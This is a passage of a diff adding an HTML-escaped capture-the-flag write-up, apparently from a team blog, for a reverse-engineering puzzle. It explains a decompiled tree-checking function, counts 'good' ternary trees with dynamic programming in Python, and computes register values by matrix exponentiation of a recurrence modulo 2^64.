+&lt;p&gt;Well... it is just enumerating all the ternary trees with depth $n$, where each of the leaf node is on level $n$.&lt;/p&gt;
+
+&lt;p&gt;After that, we check the number of &lt;em&gt;good&lt;/em&gt; trees. By &lt;em&gt;good&lt;/em&gt; it is defined by (former) &lt;code&gt;sub_4009C4&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_good_tree&lt;/span&gt;(Node &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;node, &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; k)
+{
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; ka; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+4h] [rbp-1Ch]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; kb; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+4h] [rbp-1Ch]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Ch] [rbp-4h]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  ka &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; k;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; k )
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; k )
+    ka &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size;
+  kb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ka &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( kb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
+    kb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; i; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
+  {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)is_good_tree(node&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;child[i], kb) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1LL&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;harrier has implemented a &lt;em&gt;good&lt;/em&gt; tree checker &lt;del&gt;(himself)&lt;/del&gt; in Discord for me to test with:&lt;/p&gt;
+
+&lt;figure&gt;
+    &lt;img src=&#34;https://b6a.black/images/2020-09-08-confidencectf/harrier-checker.png&#34;/&gt; 
+&lt;/figure&gt;
+
+
+&lt;p&gt;After all, a tree is said to be &lt;em&gt;good&lt;/em&gt; if both of the condition are satisfied:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;for each node with two children, every children should have at most one children, and&lt;/li&gt;
+&lt;li&gt;for each node with three children, every children and their grandchildren should have at most one children.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Cool. We have the pieces of the puzzle gathered. Define $g(n)$ to be the number of good trees of depth $n$. We are going to find $g(1337)$ and move the sequence forward by $g(1337)$ instructions.&lt;/p&gt;
+
+&lt;h3 id=&#34;part-iii-verifying-this-for-the-baby-cases&#34;&gt;Part III: Verifying this for the baby cases&lt;/h3&gt;
+
+&lt;p&gt;We are double checking if our observation checks out for smaller $n$&#39;s. From above, $g(0) = 1$, $g(1) = 3\ \text{or}\ 4$, $g(2) = 5$ and $g(3) = 15\ \text{or}\ 16$.&lt;/p&gt;
+
+&lt;p&gt;For $n = 0$, the only tree would be:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=point]
+  edge[arrowhead=false]
+  
+  t0
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Yeah. It is a good tree. Thus $g(0) = 1$. Also, $g(1) = 3$ since the three trees are all good:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=point]
+  edge[arrowhead=false]
+  
+  t0_0 -&amp;gt; t0_1 
+  
+  t1_0 -&amp;gt; t1_1 
+  t1_0 -&amp;gt; t1_2 
+  
+  t2_0 -&amp;gt; t2_1 
+  t2_0 -&amp;gt; t2_2 
+  t2_0 -&amp;gt; t2_3 
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;For $n = 2$, we start rejecting trees. There are 39 trees, but there are only five being good. Hence $g(2) = 5$.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=point]
+  edge[arrowhead=false]
+  
+  t0_0 -&amp;gt; t0_1 
+  t0_1 -&amp;gt; t0_2 
+  
+  t3_0 -&amp;gt; t3_1 
+  t3_1 -&amp;gt; t3_2 
+  t3_1 -&amp;gt; t3_3 
+  
+  t4_0 -&amp;gt; t4_1 
+  t4_1 -&amp;gt; t4_2 
+  t4_1 -&amp;gt; t4_3 
+  t4_1 -&amp;gt; t4_4 
+  
+  t1_0 -&amp;gt; t1_1 
+  t1_0 -&amp;gt; t1_2 
+  t1_1 -&amp;gt; t1_3 
+  t1_2 -&amp;gt; t1_4 
+  
+  t2_0 -&amp;gt; t2_1 
+  t2_0 -&amp;gt; t2_2 
+  t2_0 -&amp;gt; t2_3 
+  t2_1 -&amp;gt; t2_4 
+  t2_2 -&amp;gt; t2_5 
+  t2_3 -&amp;gt; t2_6 
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And $g(3) = 15$. They are:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=point]
+  edge[arrowhead=false]
+  
+  t0_0 -&amp;gt; t0_1 
+  t0_1 -&amp;gt; t0_2 
+  t0_2 -&amp;gt; t0_3 
+  
+  t5_0 -&amp;gt; t5_1 
+  t5_1 -&amp;gt; t5_2 
+  t5_2 -&amp;gt; t5_3 
+  t5_2 -&amp;gt; t5_4 
+  
+  t6_0 -&amp;gt; t6_1 
+  t6_1 -&amp;gt; t6_2 
+  t6_2 -&amp;gt; t6_3 
+  t6_2 -&amp;gt; t6_4 
+  t6_2 -&amp;gt; t6_5 
+  
+  t3_0 -&amp;gt; t3_1 
+  t3_1 -&amp;gt; t3_2 
+  t3_1 -&amp;gt; t3_3 
+  t3_2 -&amp;gt; t3_4 
+  t3_3 -&amp;gt; t3_5 
+  
+  t4_0 -&amp;gt; t4_1 
+  t4_1 -&amp;gt; t4_2 
+  t4_1 -&amp;gt; t4_3 
+  t4_1 -&amp;gt; t4_4 
+  t4_2 -&amp;gt; t4_5 
+  t4_3 -&amp;gt; t4_6 
+  t4_4 -&amp;gt; t4_7 
+  
+  t1_0 -&amp;gt; t1_1 
+  t1_0 -&amp;gt; t1_2 
+  t1_1 -&amp;gt; t1_3 
+  t1_2 -&amp;gt; t1_4 
+  t1_3 -&amp;gt; t1_5 
+  t1_4 -&amp;gt; t1_6 
+  
+  t7_0 -&amp;gt; t7_1 
+  t7_0 -&amp;gt; t7_2 
+  t7_1 -&amp;gt; t7_3 
+  t7_2 -&amp;gt; t7_4 
+  t7_3 -&amp;gt; t7_5 
+  t7_4 -&amp;gt; t7_6 
+  t7_4 -&amp;gt; t7_7 
+    
+  t8_0 -&amp;gt; t8_1 
+  t8_0 -&amp;gt; t8_2 
+  t8_1 -&amp;gt; t8_3 
+  t8_2 -&amp;gt; t8_4 
+  t8_3 -&amp;gt; t8_5 
+  t8_4 -&amp;gt; t8_6 
+  t8_4 -&amp;gt; t8_7 
+  t8_4 -&amp;gt; t8_8 
+
+  t9_0 -&amp;gt; t9_1 
+  t9_0 -&amp;gt; t9_2 
+  t9_1 -&amp;gt; t9_3 
+  t9_2 -&amp;gt; t9_4 
+  t9_3 -&amp;gt; t9_5 
+  t9_3 -&amp;gt; t9_6 
+  t9_4 -&amp;gt; t9_7 
+}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=point]
+  edge[arrowhead=false]
+  
+  t10_0 -&amp;gt; t10_1
+  t10_0 -&amp;gt; t10_2 
+  t10_1 -&amp;gt; t10_3 
+  t10_2 -&amp;gt; t10_4 
+  t10_3 -&amp;gt; t10_5 
+  t10_3 -&amp;gt; t10_6 
+  t10_4 -&amp;gt; t10_7 
+  t10_4 -&amp;gt; t10_8 
+  
+  t11_0 -&amp;gt; t11_1 
+  t11_0 -&amp;gt; t11_2 
+  t11_1 -&amp;gt; t11_3 
+  t11_2 -&amp;gt; t11_4 
+  t11_3 -&amp;gt; t11_5 
+  t11_3 -&amp;gt; t11_6 
+  t11_4 -&amp;gt; t11_7 
+  t11_4 -&amp;gt; t11_8 
+  t11_4 -&amp;gt; t11_9 
+  
+  t12_0 -&amp;gt; t12_1 
+  t12_0 -&amp;gt; t12_2 
+  t12_1 -&amp;gt; t12_3 
+  t12_2 -&amp;gt; t12_4 
+  t12_3 -&amp;gt; t12_5 
+  t12_3 -&amp;gt; t12_6 
+  t12_3 -&amp;gt; t12_7 
+  t12_4 -&amp;gt; t12_8 
+
+  t13_0 -&amp;gt; t13_1 
+  t13_0 -&amp;gt; t13_2 
+  t13_1 -&amp;gt; t13_3 
+  t13_2 -&amp;gt; t13_4 
+  t13_3 -&amp;gt; t13_5 
+  t13_3 -&amp;gt; t13_6 
+  t13_3 -&amp;gt; t13_7 
+  t13_4 -&amp;gt; t13_8 
+  t13_4 -&amp;gt; t13_9 
+ 
+  t14_0 -&amp;gt; t14_1 
+  t14_0 -&amp;gt; t14_2 
+  t14_1 -&amp;gt; t14_3 
+  t14_2 -&amp;gt; t14_4 
+  t14_3 -&amp;gt; t14_5 
+  t14_3 -&amp;gt; t14_6 
+  t14_3 -&amp;gt; t14_7 
+  t14_4 -&amp;gt; t14_8 
+  t14_4 -&amp;gt; t14_9 
+  t14_4 -&amp;gt; t14_10 
+
+  t2_0 -&amp;gt; t2_1 
+  t2_0 -&amp;gt; t2_2 
+  t2_0 -&amp;gt; t2_3 
+  t2_1 -&amp;gt; t2_4 
+  t2_2 -&amp;gt; t2_5 
+  t2_3 -&amp;gt; t2_6 
+  t2_4 -&amp;gt; t2_7 
+  t2_5 -&amp;gt; t2_8 
+  t2_6 -&amp;gt; t2_9 
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cool! Everything checks out! Luckily the memory overflows when $n = 4$, otherwise our OCD would be forcing us to find $g(4)$ and the writeup will be flooded by a large forest.&lt;/p&gt;
+
+&lt;h3 id=&#34;part-iv-algorithms-algorithms-everywhere&#34;&gt;Part IV: Algorithms, algorithms everywhere&lt;/h3&gt;
+
+&lt;p&gt;In this part, harrier and I work on a different topic:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;harrier&#39;s task: Find $g(1337)$.&lt;/li&gt;
+&lt;li&gt;Mystiz&#39;s task: Find the flag if harrier has $g(1337)$ computed.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&#34;41-what-is-g1337&#34;&gt;4.1. What is $g(1337)$?&lt;/h4&gt;
+
+&lt;p&gt;To find the number of &lt;em&gt;good&lt;/em&gt; trees of height $h$, we define an auxiliary variable $k$ (interpret it as &lt;em&gt;cooldown&lt;/em&gt;). Here we redefine &lt;em&gt;good&lt;/em&gt; trees again:&lt;/p&gt;
+
+&lt;p&gt;For a ternary tree, it is said to be &lt;em&gt;good&lt;/em&gt; if for every node,&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;[Recovery]&lt;/strong&gt; if $k &amp;gt; 0$: there should be at most one child, and&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;[Fertility]&lt;/strong&gt; if $k = 0$: if there are $c$ children, then each of them has cooldown $k = c-1$.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Simply put, you need to &lt;em&gt;recover&lt;/em&gt; to be &lt;em&gt;fertile&lt;/em&gt;. For instance, the following is a good tree since each of the node with non-zero cooldown has only a child.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=rectangle, style=rounded]
+  
+  t0 [label=0]
+  t1 [label=1]
+  t2 [label=1]
+  t3 [label=0]
+  t4 [label=0]
+  
+  t0-&amp;gt;t1
+  t0-&amp;gt;t2
+  t1-&amp;gt;t3
+  t2-&amp;gt;t4
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, this is not a &lt;em&gt;good&lt;/em&gt; tree since the red node is too fertile:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=rectangle, style=rounded]
+  
+  t0 [label=0]
+  t1 [label=1, style=&amp;#34;filled, rounded&amp;#34;, fillcolor=&amp;#34;#ff000080&amp;#34;]
+  t2 [label=1]
+  t3 [label=0]
+  t4 [label=0]
+  t5 [label=0]
+  
+  t0-&amp;gt;t1
+  t0-&amp;gt;t2
+  t1-&amp;gt;t3
+  t1-&amp;gt;t4
+  t2-&amp;gt;t5
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Luckily, we don&#39;t need to count the &lt;em&gt;good&lt;/em&gt; trees one by one. It can be solved by dynamic programming rather easily. Let&#39;s define the state &lt;code&gt;dp[h][k]&lt;/code&gt; to be the number of &lt;em&gt;good&lt;/em&gt; trees if the tree is of depth &lt;code&gt;h&lt;/code&gt; and cooldown &lt;code&gt;k&lt;/code&gt;. Then:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;[Base case]&lt;/strong&gt; &lt;code&gt;dp[0][k] == 1&lt;/code&gt; for every &lt;code&gt;k&lt;/code&gt;,&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;[Transition]&lt;/strong&gt; &lt;code&gt;dp[h][k] == dp[h-1][k-1]&lt;/code&gt; for &lt;code&gt;h, k &amp;gt; 0&lt;/code&gt;, and&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;[Transition]&lt;/strong&gt; &lt;code&gt;dp[h][0] == dp[h-1][0] + dp[h-1][1]**2 + dp[h-1][2]**3&lt;/code&gt; for &lt;code&gt;h &amp;gt; 0&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The first condition is obvious - the only tree with depth 0 is the tree with the only root node. It is &lt;em&gt;good&lt;/em&gt; no matter what the cooldown is.&lt;/p&gt;
+
+&lt;p&gt;For the second condition, it is not difficult to imagine it as an tree that must cooldown. Hence, if $\text{GT}_{hk}$ is a &lt;em&gt;good&lt;/em&gt; tree with height $h&amp;gt;0$ and cooldown $k&amp;gt;0$, then:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=point]
+  edge[arrowhead=false]
+  x-&amp;gt;st
+  subgraph cluster {
+    style=filled
+    color=lightgray
+    label=&amp;#34;GTₕ₋₁,ₖ₋₁&amp;#34;
+    labelloc=b
+    st[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
+  }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It is a little bit tricky for the third condition. Since it is in the &lt;em&gt;fertile&lt;/em&gt; mode again, we can decide if there are one, two or three children. Then each of the following trees work:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-viz-dot&#34; data-lang=&#34;viz-dot&#34;&gt;digraph {
+  node[shape=point]
+  edge[arrowhead=false]
+  x0-&amp;gt;st0
+  subgraph cluster0 {
+    style=filled
+    color=lightgray
+    label=&amp;#34;GTₕ₋₁,₀&amp;#34;
+    labelloc=b
+    st0[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
+  }
+  
+  x1-&amp;gt;st1:n
+  x1-&amp;gt;st2:n
+  subgraph cluster1 {
+    style=filled
+    color=lightgray
+    label=&amp;#34;Each subtree is GTₕ₋₁,₁&amp;#34;
+    labelloc=b
+    st1[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
+    st2[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
+  }
+  
+  x2-&amp;gt;st3:n
+  x2-&amp;gt;st4:n
+  x2-&amp;gt;st5:n
+  subgraph cluster2 {
+    style=filled
+    color=lightgray
+    label=&amp;#34;Each subtree is GTₕ₋₁,₂&amp;#34;
+    labelloc=b
+    st3[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
+    st4[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
+    st5[shape=triangle, height=2, label=&amp;#34;&amp;#34;]
+  }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Hence, if there are &lt;code&gt;k&lt;/code&gt; children, then there are &lt;code&gt;dp[h-1][k-1]**k&lt;/code&gt; choices. Since we are able to pick &lt;code&gt;k = 1, 2, 3&lt;/code&gt;, we can simply sum them up for &lt;code&gt;dp[h][k]&lt;/code&gt;. After all, this is the Python script to compute:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;(k: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
+  &lt;span style=&#34;color:#75715e&#34;&gt;# Base case&lt;/span&gt;
+  dp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]]
+  &lt;span style=&#34;color:#75715e&#34;&gt;# Transition&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(k):
+    dp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append([
+      sum([dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][i]&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;(i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)]), dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
+    ])
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;But the numbers is growing exponentially and finding $g(1337)$ takes eternally. What can we do? Nevermind, we will get back to this shortly.&lt;/p&gt;
+
+&lt;h4 id=&#34;42-fast-sequence-generation&#34;&gt;4.2. Fast sequence generation&lt;/h4&gt;
+
+&lt;p&gt;To compute the values of &lt;code&gt;ecx&lt;/code&gt; and &lt;code&gt;edx&lt;/code&gt;, we can find the number of executed instructions (denote it as $q$). Since the loop is completed every four steps, we can find $s_{\mathbf{floor}(q/4)}$ and $s_{\mathbf{floor}(q/4)+1}$ and perform the remainder of the instructions.&lt;/p&gt;
+
+&lt;p&gt;Let&#39;s get back to the sequence $s_n$:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;$s_0 = \text{82F96AC97429A68B}_{16}$,&lt;/li&gt;
+&lt;li&gt;$s_1 = \text{32B9B6BCA55548ED}_{16}$, and&lt;/li&gt;
+&lt;li&gt;$s_k = 3 s_{k-2} + 2 s_{k-1} + 4\mod2^{64}$ for $k \geq 2$.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To compute it efficiently, we can rewrite it as a matrix notation:&lt;/p&gt;
+
+&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
+\begin{bmatrix} s_{k+1} \\ s_k \\ 1 \end{bmatrix}
+= \begin{bmatrix} 2 &amp; 3 &amp; 4 \\ 1 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 1\end{bmatrix}
+\begin{bmatrix} s_k \\ s_{k-1} \\ 1 \end{bmatrix} \mod 2^{64}.
+\]&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Why? Try the multiplication by yourselves! Anyway, then we are able to compute $s_m$ and $s_{m+1}$ efficiently, since&lt;/p&gt;
+
+&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
+\begin{bmatrix} s_{m+1} \\ s_m \\ 1 \end{bmatrix}
+= \begin{bmatrix} 2 &amp; 3 &amp; 4 \\ 1 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 1\end{bmatrix}^m
+\begin{bmatrix} s_1 \\ s_0 \\ 1 \end{bmatrix} \mod 2^{64}.
+\]&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Moreover, since&lt;/p&gt;
+
+&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{bmatrix} 2 &amp; 3 &amp; 4 \\ 1 &amp; 0 &amp; 0 \\ 0 &amp; 0 &amp; 1\end{bmatrix}^{2^{64}}
+= \begin{bmatrix} 1 &amp; 0 &amp; 0 \\ 0 &amp; 1 &amp; 0 \\ 0 &amp; 0 &amp; 1\end{bmatrix},
+\]&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;the square matrix has order $2^{64}$. That said, we don&#39;t need to find the exact value for $g(1337)$. Instead, we can compute $g(1337)\mod (2^{64}\times4)$. Hereby we need to multiple the number by four, since there are 4 instructions per loop).&lt;/p&gt;
+
+&lt;h3 id=&#34;part-v-the-flagggggggggg&#34;&gt;Part V: The flagggggggggg!&lt;/h3&gt;
+
+&lt;p&gt;After all, we can modify the Python function we had to compute $g(k)\mod 2^{66}$:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;g&lt;/span&gt;(k: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
+  &lt;span style=&#34;color:#75715e&#34;&gt;# Base case&lt;/span&gt;
+  dp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]]
+  &lt;span style=&#34;color:#75715e&#34;&gt;# Transition&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(k):
+    dp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append([
+      sum([dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][i]&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;(i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
+    ])
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; dp[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;][&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;And &lt;code&gt;g(1337) = 59988074356265869957&lt;/code&gt; pops out at no time. Therefore, we can find $s_{14997018589066467489}$ and $s_{14997018589066467490}$ and proceed one instruction further. We have &lt;code&gt;rdx&lt;/code&gt; being &lt;code&gt;0x62246322232ceabf&lt;/code&gt; and &lt;code&gt;rcx&lt;/code&gt; being &lt;code&gt;0xbf1d9826c054007&lt;/code&gt;!&lt;/p&gt;
+
+&lt;p&gt;Thus &lt;code&gt;p4{62246322232ceabfbf1d9826c054007}&lt;/code&gt; would be the flag, right? NO!&lt;/p&gt;
+
